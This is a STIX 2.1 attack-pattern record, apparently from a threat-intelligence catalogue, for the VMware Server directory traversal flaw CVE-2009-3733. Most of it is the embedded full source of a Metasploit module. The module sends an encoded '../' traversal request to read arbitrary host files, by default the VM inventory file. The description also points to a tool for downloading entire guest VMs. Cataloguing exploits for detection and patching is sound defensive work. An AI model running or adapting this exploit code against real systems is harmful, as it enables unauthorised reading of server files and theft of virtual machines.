{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d05178a-8812-4604-82cc-4dfacccbefda",
    "created": "2024-08-14T16:27:32.861933Z",
    "modified": "2024-08-14T16:27:32.861937Z",
    "name": "VMware Server Directory Traversal Vulnerability",
    "description": "This modules exploits the VMware Server Directory Traversal vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before 2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5 allows remote attackers to read arbitrary files. Common VMware server ports 80/8222 and 443/8333 SSL.  If you want to download the entire VM, check out the gueststealer tool.'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vmware/vmware_server_dir_trav.rb",
            "external_id": "vmware_server_dir_trav.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2009-0015.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3733"
        },
        {
            "source_name": "reference",
            "url": "http://fyrmassociates.com/tools/gueststealer-v1.1.pl"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'VMware Server Directory Traversal Vulnerability',\n      'Description' => 'This modules exploits the VMware Server Directory Traversal\n        vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before\n        2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5\n        allows remote attackers to read arbitrary files. Common VMware server ports\n        80/8222 and 443/8333 SSL.  If you want to download the entire VM, check out\n        the gueststealer tool.',\n      'Author'      => 'CG' ,\n      'License'     => MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],\n          [ 'OSVDB', '59440' ],\n          [ 'BID', '36842' ],\n          [ 'CVE', '2009-3733' ],\n          [ 'URL', 'http://fyrmassociates.com/tools/gueststealer-v1.1.pl' ]\n        ]\n    )\n    register_options(\n      [\n        Opt::RPORT(8222),\n        OptString.new('FILE', [ true,  \"The file to view\", '/etc/vmware/hostd/vmInventory.xml']),\n        OptString.new('TRAV', [ true,  \"Traversal Depth\", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),\n      ])\n  end\n\n  def run_host(target_host)\n\n    begin\n      file = datastore['FILE']\n      trav = datastore['TRAV']\n      res = send_request_raw({\n        'uri'          => trav+file,\n        'version'      => '1.1',\n        'method'       => 'GET'\n      }, 25)\n\n      if res.nil?\n        print_error(\"Connection timed out\")\n        return\n      end\n\n      if res.code == 200\n        #print_status(\"Output Of Requested File:\\n#{res.body}\")\n        print_good(\"#{target_host}:#{rport} appears vulnerable to VMWare Directory Traversal Vulnerability\")\n        report_vuln(\n          {\n            :host   => target_host,\n            :port\t=> rport,\n            :proto  => 'tcp',\n            :name\t=> self.name,\n            :info   => \"Module #{self.fullname} reports directory traversal of #{target_host}:#{rport} with response code #{res.code}\",\n            :refs   => self.references,\n            :exploited_at => Time.now.utc\n          }\n        )\n      else\n        vprint_status(\"Received #{res.code} for #{trav}#{file}\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      print_error(e.message)\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}